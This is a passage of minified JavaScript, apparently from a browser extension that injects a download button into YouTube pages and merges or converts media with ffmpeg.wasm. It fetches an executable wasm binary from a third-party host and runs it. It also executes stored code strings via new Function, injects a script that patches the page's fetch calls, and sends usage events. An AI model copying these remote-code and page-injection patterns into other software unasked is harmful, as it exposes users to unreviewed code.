                transform_media_info(data, id, (mediaInfo) => setMediaInfo({ mediaInfo: mediaInfo }));
            },
            media_conversion_mode = (mediaInfo) =>
                mediaInfo.directUrl
                    ? "none"
                    : mediaInfo.conversionRequired
                    ? isVideoWebm(mediaInfo)
                        ? "webm->" + mediaInfo.type
                        : mediaInfo.mimeType.includes("video/mp4")
                        ? "mp4->" + mediaInfo.type
                        : isAudioMp3(mediaInfo) && needsConversionAudio(mediaInfo)
                        ? "mp4->mp3"
                        : "download"
                    : "download";
        var ffmpeg_createFFmpeg = (_options = {}) => {
                const NO_LOAD = Error("ffmpeg.wasm is not ready, make sure you have completed load().");
                let duration = 0,
                    ratio = 0;
                const ts2sec = (ts) => {
                    const [h, m, s] = ts.split(":");
                    return 60 * parseFloat(h) * 60 + 60 * parseFloat(m) + parseFloat(s);
                };
                let _logging = !1,
                    customLogger = () => {};
                const setLogging = (logging) => {
                        _logging = logging;
                    },
                    setCustomLogger = (logger) => {
                        customLogger = logger;
                    },
                    log = (type, message) => {
                        customLogger({ type: type, message: message }), _logging && console.log(`[${type}] ${message}`);
                    },
                    defaultArgs = ["./ffmpeg", "-nostdin", "-y"],
                    { log: logging, logger: logger, progress: optProgress, ...options } = { log: !1, logger: () => {}, progress: () => {}, ..._options };
                let Core = null,
                    ffmpeg = null,
                    runResolve = null,
                    running = !1,
                    progress = optProgress;
                const parseMessage = ({ type: type, message: message }) => {
                    log(type, message),
                        ((message, progress) => {
                            if ("string" == typeof message)
                                if (message.startsWith("  Duration")) {
                                    const ts = message.split(", ")[0].split(": ")[1],
                                        d = ts2sec(ts);
                                    progress({ duration: d, ratio: ratio }), (0 === duration || duration > d) && (duration = d);
                                } else if (message.startsWith("frame") || message.startsWith("size")) {
                                    const ts = message.split("time=")[1].split(" ")[0],
                                        t = ts2sec(ts);
                                    (ratio = t / duration), progress({ ratio: ratio, time: t });
                                } else message.startsWith("video:") && (progress({ ratio: 1 }), (duration = 0));
                        })(message, progress),
                        ((message) => {
                            "FFMPEG_END" === message && null !== runResolve && (runResolve(), (runResolve = null), (running = !1));
                        })(message);
                };
                return (
                    setLogging(logging),
                    setCustomLogger(logger),
                    log("info", "use ffmpeg.wasm v0.10.1"),
                    {
                        setProgress: (_progress) => {
                            progress = _progress;
                        },
                        setLogger: (_logger) => {
                            setCustomLogger(_logger);
                        },
                        setLogging: setLogging,
                        load: async () => {
                            if ((log("info", "load ffmpeg-core"), null !== Core)) throw Error("ffmpeg.wasm was loaded, you should not load it again, use ffmpeg.isLoaded() to check next time.");
                            {
                                log("info", "loading ffmpeg-core");
                                const { createFFmpegCore: createFFmpegCore } = window;
                                (Core = await createFFmpegCore({
                                    mainScriptUrlOrBlob: options.mainScriptUrlOrBlob,
                                    printErr: (message) => parseMessage({ type: "fferr", message: message }),
                                    print: (message) => parseMessage({ type: "ffout", message: message }),
                                    locateFile: (path, prefix) => prefix + path,
                                })),
                                    (ffmpeg = Core._main),
                                    log("info", "ffmpeg-core loaded");
                            }
                        },
                        isLoaded: () => null !== Core,
                        run: (..._args) => {
                            if ((log("info", "run ffmpeg command: " + _args.join(" ")), null === Core)) throw NO_LOAD;
                            if (running) throw Error("ffmpeg.wasm can only run one command at a time");
                            return (
                                (running = !0),
                                new Promise((resolve) => {
                                    const args = [...defaultArgs, ..._args].filter((s) => 0 !== s.length);
                                    (runResolve = resolve),
                                        ffmpeg(
                                            ...((Core, args) => {
                                                const argsPtr = Core._malloc(args.length * Uint32Array.BYTES_PER_ELEMENT);
                                                return (
                                                    args.forEach((s, idx) => {
                                                        const buf = Core._malloc(s.length + 1);
                                                        Core.writeAsciiToMemory(s, buf), Core.setValue(argsPtr + Uint32Array.BYTES_PER_ELEMENT * idx, buf, "i32");
                                                    }),
                                                    [args.length, argsPtr]
                                                );
                                            })(Core, args)
                                        );
                                })
                            );
                        },
                        exit: () => {
                            if (null === Core) throw NO_LOAD;
                            (running = !1), Core.exit(1), (Core = null), (ffmpeg = null), (runResolve = null);
                        },
                        FS: (method, ...args) => {
                            if ((log("info", `run FS.${method} ${args.map((arg) => ("string" == typeof arg ? arg : `<${arg.length} bytes binary file>`)).join(" ")}`), null === Core)) throw NO_LOAD;
                            {
                                let ret = null;
                                try {
                                    ret = Core.FS[method](...args);
                                } catch (e) {
                                    throw "readdir" === method
                                        ? Error(`ffmpeg.FS('readdir', '${args[0]}') error. Check if the path exists, ex: ffmpeg.FS('readdir', '/')`)
                                        : "readFile" === method
                                        ? Error(`ffmpeg.FS('readFile', '${args[0]}') error. Check if the path exists`)
                                        : Error("Oops, something went wrong in FS operation.");
                                }
                                return ret;
                            }
                        },
                    }
                );
            },
            ffmpeg_core = __webpack_require__(148),
            ffmpeg_core_default = __webpack_require__.n(ffmpeg_core);
        var get_wasm_code_remote = async () => {
            const response = await fetchBack("https://unidownloader.com/src/usrjs/ffmpeg.0.1.wasm", {}, "arrayBuffer");
            return new Uint8Array(response);
        };
        var ffmpeg_worker = () => {
            let fs;
            const error = (e) => postMessage({ type: "error", log: { name: e.name, message: e.message } }),
                ctx = { cancelCalled: !1, ffWorker: null, ffWorkerLoaded: null };
            self.window = self;
            const convert = (inFormat) => (outFormat) => async (audioArrayBuffer, videoArrayBuffer) => {
                    try {
                        const ffWorker = await ctx.ffWorker;
                        await ffWorker.FS("writeFile", "audio." + inFormat, audioArrayBuffer), await ffWorker.FS("writeFile", "video." + inFormat, videoArrayBuffer);
                        const args = ["-i", "video." + inFormat, "-i", "audio." + inFormat, "-c", "copy", "output." + outFormat];
                        return await ffWorker.run(...args), ffWorker.FS("readFile", "output." + outFormat);
                    } catch (err) {
                        if (ctx.cancelCalled) return null;
                        throw err;
                    }
                },
                converters = { "mp4->mp4": convert("mp4")("mp4"), "mp4->webm": convert("mp4")("webm"), "webm->mp4": convert("webm")("mp4"), "webm->webm": convert("webm")("webm") };
            onmessage = async (msg) => {
                if (
                    ((self.window = self),
                    "stop" === msg.data.type && (console.log("WORKER: TRY TO STOP"), (ctx.cancelCalled = !0), ctx.ffWorker.exit()),
                    "init" === msg.data.type &&
                        (ctx.ffWorker = new Promise(async (resolve, reject) => {
                            try {
                                const workerGetFS = new Function(`return ${msg.data.getFS}();`);
                                fs = workerGetFS();
                                const file = await fs.readFile("ffmpeg.wasm");
                                self.window.ffmpegWasmBinary = file;
                                const createFFmpegCoreSrc = await fs.readFile("createFFmpegCore.js");
                                (window.__filename = void 0),
                                    (window._scriptDir = "undefined" != typeof document && document.currentScript ? document.currentScript.src : void 0),
                                    (window.createFFmpegCore = new Function(`return ${createFFmpegCoreSrc};`)());
                                const createFFmpegSrc = await fs.readFile("createFFmpeg.js");
                                resolve(
                                    new Function("options", `return (${createFFmpegSrc})(options)`)({
                                        progress: (progress) => {
                                            postMessage({ type: "progress", progress: 100 * progress.ratio });
                                        },
                                    })
                                ),
                                    postMessage("FFMPEG STARTED!!!");
                            } catch (e) {
                                error(e), reject(e);
                            }
                        })),
                    "mp4->mp3" !== msg.data.type)
                ) {
                    if (msg.data.type.includes("->")) {
                        if (!(msg.data.type in converters)) return void error(`converter ${msg.data.type} not found`);
                        ctx.cancelCalled = !1;
                        const { audio: audio, video: video } = msg.data;
                        try {
                            const audioArrayBuffer = await fs.getContent(audio),
                                videoArrayBuffer = await fs.getContent(video),
                                ffWorker = await ctx.ffWorker;
                            ffWorker.isLoaded() || (await ffWorker.load());
                            const conversionFunction = converters[msg.data.type],
                                data = await conversionFunction(audioArrayBuffer, videoArrayBuffer);
                            ctx.cancelCalled || postMessage({ type: "converted", data: data });
                        } catch (e) {
                            console.log("ERROR!!!", e), error(e);
                        }
                    }
                } else {
                    console.log("mp4->mp3"), (ctx.cancelCalled = !1);
                    const { audio: audio, bitrate: bitrate } = msg.data;
                    try {
                        const audioArrayBuffer = await fs.getContent(audio),
                            ffWorker = await ctx.ffWorker;
                        ffWorker.isLoaded() || (await ffWorker.load());
                        const data = await (async (audioArrayBuffer, bitrate) => {
                            try {
                                const ffWorker = await ctx.ffWorker;
                                await ffWorker.FS("writeFile", "audio.m4a", audioArrayBuffer);
                                const args = ["-i", "audio.m4a", "-acodec", "libmp3lame", "-ab", bitrate + "k" || "128k", "output.mp3"];
                                return await ffWorker.run(...args), ffWorker.FS("readFile", "output.mp3");
                            } catch (err) {
                                if (ctx.cancelCalled) return null;
                                throw err;
                            }
                        })(audioArrayBuffer, bitrate);
                        ctx.cancelCalled || postMessage({ type: "mp3", data: data });
                    } catch (e) {
                        error(e);
                    }
                }
            };
        };
        let ffmpegWorker, start_worker_progress, workerBody, start_worker_wasm;
        const startWorker = async (progressCb, getSharedState) => {
            const fs = idbfs();
            if (((await fs.existsFile("ffmpeg.wasm")) || (start_worker_wasm = get_wasm_code_remote()), (start_worker_progress = progressCb), !(await fs.existsFile("ffmpeg.wasm")))) {
                const rawData = await start_worker_wasm;
                await fs.writeFile("ffmpeg.wasm", rawData), await fs.writeFile("createFFmpegCore.js", ffmpeg_core_default.a.toString()), await fs.writeFile("createFFmpeg.js", ffmpeg_createFFmpeg.toString()), (start_worker_wasm = null);
            }
            if (!workerBody) {
                const js = `(${ffmpeg_worker.toString()})();`,
                    blob = new Blob([js], { type: "text/javascript" });
                workerBody = URL.createObjectURL(blob);
            }
            return (
                (ffmpegWorker = new Worker(workerBody)),
                (ffmpegWorker.onmessage = (e) => {
                    if ("converted" === e.data.type) {
                        const { cancelCalled: cancelCalled, resolveStream: resolveStream } = getSharedState();
                        cancelCalled || resolveStream(e.data.data), (ffmpegWorker = null), startWorker(start_worker_progress, getSharedState);
                    }
                    if ("mp3" === e.data.type) {
                        const { cancelCalled: cancelCalled, resolveStream: resolveStream } = getSharedState();
                        cancelCalled || resolveStream(e.data.data), (ffmpegWorker = null), startWorker(start_worker_progress, getSharedState);
                    }
                    "progress" === e.data.type && start_worker_progress(e.data.progress), "error" === e.data.type && window.sendLog && window.sendLog({ type: "web-worker error", info: e.data.log });
                }),
                ffmpegWorker.postMessage({ type: "init", getFS: idbfs.toString() }),
                ffmpegWorker
            );
        };
        var start_worker = startWorker;
        let media_converters_ffmpegWorker;
        const sharedState = { cancelCalled: !1, resolveStream: null },
            media_converters_getSharedState = () => sharedState,
            media_converters_startWorker = (progressCb, setStopWorker) => {
                if (((media_converters_ffmpegWorker = start_worker(progressCb, media_converters_getSharedState)), setStopWorker)) {
                    setStopWorker(async () => {
                        (sharedState.cancelCalled = !0),
                            console.log("STOP WORKER!!!"),
                            (await media_converters_ffmpegWorker).postMessage({ type: "stop" }),
                            (media_converters_ffmpegWorker = media_converters_startWorker(progressCb, setStopWorker));
                    });
                }
                return media_converters_ffmpegWorker;
            },
            downloadAndConvert = (info, downloadStream, progressCb, timer) => {
                if (needsConversionAudio(info))
                    return ((info, downloadStream, progressCb, timer) => {
                        const { url: url, contentLength: contentLength, bitrate: bitrate } = info;
                        let stopMuxing;
                        timer && (timer.setConversionMode("mp4->mp3"), timer.setContentLength(contentLength), timer.downloadStarted());
                        media_converters_startWorker(
                            (progress) => progressCb({ muxed: progress }),
                            (stop) => {
                                stopMuxing = stop;
                            }
                        );
                        const { cancel: cancelMp3, stream: stream } = downloadStream(url, contentLength, progressCb, { timer: timer });
                        return {
                            cancel: () => {
                                cancelMp3(), stopMuxing && stopMuxing();
                            },
                            stream: new Promise(async (resolve, reject) => {
                                try {
                                    sharedState.cancelCalled = !1;
                                    const audio = await stream;
                                    timer && timer.downloadFinished();
                                    const convertedResolve = (mp3) => {
                                        timer && timer.conversionComplete(), resolve(new Blob([mp3], { type: "application/octet-binary" }));
                                    };
                                    (sharedState.resolveStream = convertedResolve), (await media_converters_ffmpegWorker).postMessage({ type: "mp4->mp3", audio: audio, bitrate: getMp3Rate(bitrate) });
                                } catch (e) {
                                    reject(e);
                                }
                            }),
                        };
                    })(info, downloadStream, progressCb, timer);
                let stopMuxing;
                media_converters_startWorker(
                    (progress) => progressCb({ muxed: progress }),
                    (stop) => {
                        stopMuxing = stop;
                    }
                );
                const { url: videoUrl, contentLength: videoContentLength, ranges: vRanges } = info,
                    { url: audioUrl, contentLength: audioContentLength, ranges: aRanges } = info.audio,
                    conversionMode = media_conversion_mode(info);
                timer && (timer.setConversionMode(conversionMode), timer.setContentLength(videoContentLength + audioContentLength), timer.downloadStarted());
                const { stream: vPromise, cancel: cancelVideo } = downloadStream(videoUrl, videoContentLength, progressCb, { ranges: vRanges, timer: timer }),
                    { stream: aPromise, cancel: cancelAudio } = downloadStream(audioUrl, audioContentLength, progressCb, { ranges: aRanges, timer: timer });
                return {
                    cancel: () => {
                        cancelVideo(), cancelAudio(), stopMuxing && stopMuxing();
                    },
                    stream: ((_video, _audio, conversion, timer) =>
                        new Promise(async (resolve, reject) => {
                            try {
                                const video = _video instanceof Promise ? await _video : _video,
                                    audio = _audio instanceof Promise ? await _audio : _audio;
                                timer && timer.downloadFinished(),
                                    (sharedState.cancelCalled = !1),
                                    (sharedState.resolveStream = (stream) => {
                                        timer && timer.conversionComplete(), resolve(new Blob([stream], { type: "application/octet-binary" }));
                                    }),
                                    (await media_converters_ffmpegWorker).postMessage({ type: conversion, audio: audio, video: video });
                            } catch (e) {
                                reject(e);
                            }
                        }))(vPromise, aPromise, conversionMode, timer),
                };
            };
        var get_local = (downloadStream) =>
                function (updater, timer) {
                    const item = this,
                        { url: url, contentLength: contentLength, ranges: ranges } = item;
                    return item.conversionRequired ? downloadAndConvert(item, downloadStream, updater, timer) : downloadStream(url, contentLength, updater, { timer: timer, ranges: ranges });
                },
            p_queue_dist = __webpack_require__(149),
            p_queue_dist_default = __webpack_require__.n(p_queue_dist);
        const download_stream_fs = idbfs();
        var download_stream = (url, contentLength, getChunk, options = {}) => {
            let chunkSize = 4194304;
            const { ranges: _ranges, timer: timer } = options;
            timer && (timer.setContentLength(contentLength), timer.downloadStarted());
            const dbName = `${url}_${contentLength}_${Math.random()}`,
                queue = new p_queue_dist_default.a({ concurrency: 5 });
            let data,
                cancelled = !1;
            const cancel = () => {
                    (cancelled = !0), queue.pause(), queue.clear(), data && data.close(), download_stream_fs.deleteChunkedFile(dbName);
                },
                stream = new Promise(async (res, rej) => {
                    contentLength / 10 < chunkSize && (chunkSize = Math.floor(contentLength / 10));
                    const ps = [];
                    data = await download_stream_fs.createChunkedFile(dbName);
                    const ranges = _ranges || [];
                    if (!ranges.length) {
                        const count = Math.floor(contentLength / chunkSize);
                        for (let start = 0; start < count; start++) ranges.push([start * chunkSize, (start + 1) * chunkSize - 1]);
                        const rest = contentLength % chunkSize;
                        0 !== rest && ranges.push([count * chunkSize, count * chunkSize + rest - 1]);
                    }
                    ranges.forEach(async ([start, end]) => {
                        const p = queue.add(async () => {
                            let count = 3,
                                success = !1;
                            for (; count--; )
                                try {
                                    const buf = await getChunk(url, start, end);
                                    if (cancelled) return;
                                    data.addChunk(buf, start), (success = !0);
                                    break;
                                } catch (e) {
                                    console.log("RANGES!!! get chunk error", e);
                                }
                            success || (cancel(), rej(new Error("download chunk error")));
                        });
                        ps.push(p);
                    });
                    try {
                        await Promise.all(ps), timer && timer.downloadFinished(), data.close(), res(dbName);
                    } catch (e) {
                        rej(e);
                    }
                });
            return { cancel: cancel, stream: stream };
        };
        const downloader_getContent = makeGetContent(!0);
        var gv_downloader = get_local((url, contentLength, onprogress, options) =>
            download_stream(
                url,
                contentLength,
                ((timer, onprogress) => (url, start, end) => {
                    const timeout = timer.getTimeout(end - start + 1);
                    return downloader_getContent(`${url}&range=${start}-${end}`, timeout, { onprogress: onprogress });
                })(options.timer, onprogress),
                options
            )
        );
        var utils_debounce = (func, timeout) => {
            let lock = !1;
            return () => {
                if (lock) return;
                (lock = !0),
                    setTimeout(() => {
                        (lock = !1), func();
                    }, timeout);
            };
        };
        var common = class {
            emit(...argv) {
                this.eventRouter && this.eventRouter.emit(...argv);
            }
            checkLocation() {
                this.location !== window.location.href && ((this.location = window.location.href), this.emit("locationChanged", this.widgetContainer), this.exactMatch(window.location) && this.emit("updateMediaInfoRequest")),
                    setTimeout(this.checkLocation.bind(this), 1e3);
            }
            setEventRouter(eventRouter) {
                this.eventRouter = eventRouter;
            }
            generatePublicId(name) {
                const id = random_name_generator(12);
                return this.emit("newPublicId", { name: name, id: id }), id;
            }
            inserted(_widget) {
                const widget = _widget || this.widgetContainer;
                return !!widget && document.body.contains(widget);
            }
            insertContainer(name, parentContainer, neighbour, place = "before") {
                let success = !1;
                const id = this.generatePublicId(name),
                    container = document.createElement("div");
                if (
                    (container.setAttribute("id", id),
                    neighbour || (parentContainer.appendChild(container), (success = !0)),
                    "before" === place && (parentContainer.insertBefore(container, neighbour), (success = !0)),
                    "after" === place && (neighbour.nextElementSibling ? parentContainer.insertBefore(container, neighbour.nextElementSibling) : parentContainer.appendChild(container), (success = !0)),
                    success)
                )
                    return container;
                throw new Error("failed to add a new container with name " + name);
            }
            addStyle(css) {
                const head = document.head || document.getElementsByTagName("head")[0],
                    style = document.createElement("style");
                return head.appendChild(style), style.appendChild(document.createTextNode(css)), style;
            }
            async addButton() {
                try {
                    (await this.insertDownloadButton()) && this.emit("renderWidgetRequest", this.widgetContainer);
                } catch (e) {
                    console.log("error in addButton: ", e);
                }
            }
            onLoad(callback) {
                this.exactMatch(window.location) && this.checkLayout(callback);
            }
            checkLayout(callback) {
                this.layoutIsReady() ? callback() : setTimeout(this.checkLayout.bind(this, callback), 1e3);
            }
            start() {
                this.emit("hit"), this.checkLocation();
                const addButton = this.addButton.bind(this),
                    callback = utils_debounce(this.onLoad.bind(this, addButton), 1e3);
                new MutationObserver(callback).observe(window.document.body, { childList: !0, subtree: !0 });
            }
        };
        var utils_minify = (css) => css.replace(/\s\s+/g, "").replace(/ {/g, "{").replace(/;}/g, "}").replace(/: /g, ":"),
            copy_styles = (target, properties) => {
                if (!target) return "";
                const styles = getComputedStyle(target);
                return properties
                    .map((propertyName) => {
                        const propertyValue = styles.getPropertyValue(propertyName);
                        return propertyValue ? `${propertyName}: ${propertyValue};` : "";
                    })
                    .join("");
            };
        class service_Service extends common {
            constructor() {
                super(), (this.serviceName = "gv"), (this.stylesInjected = !1), inject_script(document, "patch-fetch.js", { pattern: "player?key" }), inject_script(document, "worker-spawn.js", {});
            }
            exactMatch() {
                return isServiceMediaUrl(window.location.href);
            }
            getSubscribeButton() {
                return document.querySelector(["ytd-subscribe-button-renderer tp-yt-paper-button", "ytd-button-renderer tp-yt-paper-button", "ytd-button-renderer yt-button-shape"].join(", "));
            }
            getSubscribeButtonText(subscribeButton) {
                return subscribeButton.querySelector("yt-formatted-string");
            }
            async insertDownloadButton() {
                if (this.inserted()) return !1;
                const appButtonGapClassName = this.generatePublicId("appButtonGapClassName"),
                    modalBodyClassName = this.generatePublicId("modalBodyClassName"),
                    btnTextId = this.generatePublicId("btnTextId"),
                    t = document.querySelector("#columns #primary #primary-inner #subscribe-button.style-scope");
                if (null === t) return window.sendLog({ type: "gv: no container found" }), !1;
                const appButton = this.insertContainer("appButton", t.parentNode, t.nextSibling);
                this.widgetContainer = appButton;
                const modal = this.insertContainer("modal", document.body),
                    tooltip = this.insertContainer("tooltip", document.body),
                    notifications = this.insertContainer("notifications", document.body),
                    dropdown = this.insertContainer("dropdown", document.body),
                    rightControls = document.querySelector(".ytp-right-controls"),
                    settingsButton = document.querySelector("[data-tooltip-target-id=ytp-settings-button]"),
                    snapshot = this.insertContainer("snapshot", rightControls, settingsButton);
                snapshot.setAttribute("style", "display:none");
                const subscribeButton = this.getSubscribeButton();
                new MutationObserver(() => {
                    if (t.parentNode.contains(this.widgetContainer) && subscribeButton) {
                        const subscribeButtonText = this.getSubscribeButtonText(subscribeButton),
                            font = subscribeButtonText ? copy_styles(subscribeButtonText, ["font"]) || copy_styles(subscribeButtonText, ["font-style", "font-variant", "font-weight", "font-size", "font-family"]) : "";
                        if (!this.stylesInjected) {
                            const css = utils_minify(
                                `\n              #${appButton.id} {\n                display: flex !important;\n                flex-direction: row !important;\n                margin: auto 4px !important;\n                // align-items: center !important;\n              }\n              #${appButton.id}.${appButtonGapClassName}::before {\n                content: "";\n                width: 6px;\n              }\n              #${snapshot.id} {\n                position: relative;\n                display: inline-block;\n                width: 40px;\n                height: 100%;\n              }\n              #${dropdown.id},\n              #${tooltip.id} {\n                position: absolute;\n                top: 0;\n                width: 100%;\n                z-index: 9999;\n              }\n              #${notifications.id} {\n                position: fixed;\n                z-index: 9999;\n                display: flex;\n                flex-direction: column-reverse;\n                bottom: 0;\n                height: 0;\n              }\n              #${modal.id} {\n                position: fixed;\n                z-index: 9999;\n                top: 0;\n                width: 100%;\n              }\n              body.${modalBodyClassName} {\n                position: fixed;\n                width: 100%;\n                height: 100%;\n              }\n              body.${modalBodyClassName} #${modal.id} {\n                height: 100%;\n              }\n              body.${modalBodyClassName} #${modal.id},\n              body.${modalBodyClassName}::-webkit-scrollbar {\n                background-color: rgba(0,0,0,0.75);\n              }\n\n            `
                            );
                            this.addStyle(css), (this.stylesInjected = !0);
                        }
                        const fontStyle = utils_minify(`\n            #${btnTextId} {\n              white-space: nowrap;\n              ${font}\n            }\n          `);
                        this.fontStyle !== fontStyle && ((this.fontStyle = fontStyle), this.addStyle(this.fontStyle));
                    }
                }).observe(t.parentNode, { attributes: !1, childList: !0, characterData: !1, subtree: !0 });
                const head = document.head || document.getElementsByTagName("head")[0];
                return (
                    new MutationObserver(() => {
                        const notificationPreferenceButton = t.querySelector("#notification-preference-button"),
                            setGap = () => {
                                !notificationPreferenceButton || notificationPreferenceButton.hasAttribute("hidden") ? this.widgetContainer.classList.add(appButtonGapClassName) : this.widgetContainer.classList.remove(appButtonGapClassName);
                            };
                        setGap(), notificationPreferenceButton && new MutationObserver(setGap).observe(notificationPreferenceButton, { attributes: !0 });
                        const setButtonHeight = () => {
                            subscribeButton && this.widgetContainer.setAttribute("style", `height:${subscribeButton.offsetHeight}px`);
                        };
                        setButtonHeight(), new ResizeObserver(setButtonHeight).observe(subscribeButton);
                    }).observe(head, { attributes: !1, childList: !0, characterData: !1, subtree: !0 }),
                    !0
                );
            }
            layoutIsReady() {
                return !!window.document.querySelector("#columns #primary #primary-inner #subscribe-button.style-scope") && !!this.getSubscribeButton();
            }
        }
        const body_Table = styled_components_browser_esm.a.table.withConfig({ displayName: "body__Table", componentId: "sc-fvh0im-0" })`border-collapse:separate;border-spacing:0;`,
            body_Row = styled_components_browser_esm.a.tr.withConfig({ displayName: "body__Row", componentId: "sc-fvh0im-1" })`cursor:pointer;&:hover td{background-color:rgba(255,255,255,0.25);}`,
            body_Cell = styled_components_browser_esm.a.td.withConfig({
                displayName: "body__Cell",
                componentId: "sc-fvh0im-2",
            })`color:white;font-family:Arial,Helvetica,sans-serif;font-size:12px;vertical-align:center;height:20px;&:nth-child(1),&:nth-child(3){padding:0 6px;}&:nth-child(2){padding:0;&:last-child:after{content:"";display:inline-block;width:6px;}}& svg{display:block;max-width:12px;margin:auto;fill:white;}`,
            body_Text = styled_components_browser_esm.a.div.withConfig({
                displayName: "body__Text",
                componentId: "sc-fvh0im-3",
            })`color:white;font-family:Arial,Helvetica,sans-serif;font-size:13px;padding:0 6px 6px;box-sizing:border-box;width:${(props) => props.width}px;`;
        var embed_body = () => {
                const { info: info, itemsList: itemsList, sendEvent: sendEvent, download: download, getServiceUrl: getServiceUrl, status: status } = use_app_state(["info", "itemsList", "sendEvent", "download", "getServiceUrl", "status"]),
                    { i18n: i18n, t: t } = useTranslation(),
                    { serviceUrl: serviceUrl, webPortalHostname: webPortalHostname } = config.a,
                    [tableNode, setTableNode] = Object(react.useState)(),
                    [tableWidth, setTableWidth] = Object(react.useState)(0);
                return (
                    Object(react.useEffect)(() => {
                        const setWidth = () => {
                                const tableNodeRect = tableNode.getBoundingClientRect();
                                tableNodeRect && setTableWidth(tableNodeRect.width);
                            },
                            resizeObserver = new ResizeObserver(setWidth);
                        return (
                            tableNode && (setWidth(), resizeObserver.observe(tableNode)),
                            () => {
                                tableNode && resizeObserver.unobserve(tableNode);
                            }
                        );
                    }, [tableNode]),
                    "downloadError" === status
                        ? react_default.a.createElement(
                              react_default.a.Fragment,
                              null,
                              react_default.a.createElement(body_Text, { width: tableWidth }, t("download_error")),
                              serviceUrl &&
                                  react_default.a.createElement(
                                      body_Table,
                                      {
                                          ref: (node) => {
                                              node && setTableNode(node);
                                          },
                                      },
                                      react_default.a.createElement(
                                          "tbody",
                                          null,
                                          react_default.a.createElement(
                                              body_Row,
                                              {
                                                  onClick: (evt) => {
                                                      evt.preventDefault();
                                                      const landingUrl = getServiceUrl(info.canonicalUrl || window.location.href, i18n.language);
                                                      window.open(landingUrl, "_blank"), sendEvent({ action: "landing", format: "" });
                                                  },
                                              },
                                              react_default.a.createElement(body_Cell, null, react_default.a.createElement(extension_logo, null)),
                                              react_default.a.createElement(body_Cell, null, t("download_via_web_portal", { webPortalHostname: webPortalHostname }))
                                          )
                                      )
                                  )
                          )
                        : react_default.a.createElement(
                              body_Table,
                              null,
                              react_default.a.createElement(
                                  "tbody",
                                  null,
                                  itemsList.map((item) =>
                                      react_default.a.createElement(
                                          body_Row,
                                          {
                                              key: `${item.width}:${item.fps}:${Object.keys(item).join("")}`,
                                              onClick: (evt) => {
                                                  evt.preventDefault(), download(item);
                                              },
                                          },
                                          react_default.a.createElement(body_Cell, null, react_default.a.createElement(media_type, { media: item })),
                                          react_default.a.createElement(body_Cell, isAudio(item) && { colSpan: 2 }, react_default.a.createElement(TitleEmbed, { item: item })),
                                          isVideo(item) && react_default.a.createElement(body_Cell, null, `(${item.width}x${item.height})`)
                                      )
                                  ),
                                  serviceUrl &&
                                      react_default.a.createElement(
                                          body_Row,
                                          {
                                              onClick: (evt) => {
                                                  evt.preventDefault();
                                                  const landingUrl = getServiceUrl(info.canonicalUrl || window.location.href, i18n.language);
                                                  window.open(landingUrl, "_blank"), sendEvent({ action: "landing", format: "" });
                                              },
                                          },
                                          react_default.a.createElement(body_Cell, null, react_default.a.createElement(plus, null)),
                                          react_default.a.createElement(body_Cell, { colSpan: 2 }, t("more_formats"))
                                      )
                              )
                          )
                );
            },
            embed_styled_button = styled_components_browser_esm.a.button.withConfig({
                displayName: "button",
                componentId: "sc-11ys2bt-0",
            })`background-color:transparent;outline:none;flex:1;display:flex;align-items:center;justify-content:center;border:none;padding:0;cursor:pointer;position:relative;& svg{fill:white;}& .iconDownload{margin:0 4px;}& .iconExtensionLogo{position:absolute;left:50%;transform:scale(0.63) translateX(-65%);}`,
            embed_styled_text = styled_components_browser_esm.a.span.withConfig({
                displayName: "text",
                componentId: "sc-9pvsk7-0",
            })`user-select:none;white-space:nowrap;font-weight:600;color:white;font-family:Arial,Helvetica,sans-serif;font-size:13px;${(props) =>
                props.checkmark
                    ? '\n    &::before {\n      display: inline-block;\n      content: " ";\n      width: 4px;\n    }\n    &::after {\n      display: inline-block;\n      content: " ";\n      width: 9px;\n      height: 9px;\n      margin: 0 4px;\n      transform: rotate(45deg) scale(0.7);\n      border-right: 3px solid white;\n      border-bottom: 3px solid white;\n    }\n  '
                    : "\n    margin: 0 4px;\n  "}`;
        const app_App = () => {
            const { status: status, sendEvent: sendEvent, defaultItem: defaultItem, download: download, getServiceUrl: getServiceUrl } = use_app_state(["status", "sendEvent", "defaultItem", "download", "getServiceUrl"]),
                { i18n: i18n } = useTranslation(),
                { webPortalName: webPortalName } = config.a;
            return react_default.a.createElement(
                error_boundary,
                { embed: !0 },
                "unavailable" !== status && "error" !== status && defaultItem
                    ? react_default.a.createElement(
                          react_default.a.Fragment,
                          null,
                          react_default.a.createElement(
                              embed_styled_button,
                              {
                                  onClick: (evt) => {
                                      evt.preventDefault(), download();
                                  },
                              },
                              react_default.a.createElement(icons_download, { className: "iconDownload" })
                          ),
                          react_default.a.createElement(
                              ui_dropdown,
                              { overlay: react_default.a.createElement(embed_body, null), trigger: "click", embed: "true" },
                              react_default.a.createElement(embed_styled_button, null, react_default.a.createElement(embed_styled_text, { checkmark: !0 }, react_default.a.createElement(ExtTitle, { item: defaultItem })))
                          )
                      )
                    : react_default.a.createElement(
                          embed_styled_button,
                          {
                              onClick: (evt) => {
                                  evt.preventDefault();
                                  const landingUrl = getServiceUrl(window.location.href, i18n.language);
                                  landingUrl && (window.open(landingUrl, "_blank"), sendEvent({ action: "landing", format: "" }));
                              },
                          },
                          react_default.a.createElement(icons_download, { className: "iconDownload" }),
                          react_default.a.createElement(embed_styled_text, null, webPortalName)
                      )
            );
        };
        var embed_app = () => react_default.a.createElement(app_App, null),
            embed_download_error = () => {
                const { setStatus: setStatus } = use_app_state(["setStatus"]);
                return react_default.a.createElement(
                    error_boundary,
                    { embed: !0 },
                    react_default.a.createElement(
                        ui_dropdown,
                        { overlay: react_default.a.createElement(embed_body, null), trigger: "hover" },
                        react_default.a.createElement(
                            embed_styled_button,
                            {
                                onClick: () => {
                                    setStatus("idle");
                                },
                            },
                            react_default.a.createElement(semicircles, { className: "iconSemicircles" }),
                            react_default.a.createElement(extension_logo, { className: "iconExtensionLogo" })
                        )
                    )
                );
            };
        var embed_protected = () => {
            const { t: t } = useTranslation(),
                { publicIds: publicIds } = use_app_state(["publicIds"]),
                { btnTextId: btnTextId } = publicIds;
            return react_default.a.createElement(
                ui_tooltip,
                { title: t("protected_tooltip") },
                react_default.a.createElement(
                    embed_styled_button,
                    { enabled: !1 },
                    react_default.a.createElement(extension_logo, { className: "iconDownload" }),
                    react_default.a.createElement(embed_styled_text, { id: btnTextId }, t("protected").toUpperCase())
                )
            );
        };
        var widget_embed = () => {
                const { status: status, snap: snap } = use_app_state(["status", "snap"]),
                    components = {
                        downloading: react_default.a.createElement(progress_bar, { color: "white" }),
                        gettingInfo: react_default.a.createElement(getting_info, { color: "white" }),
                        idle: react_default.a.createElement(embed_app, null),
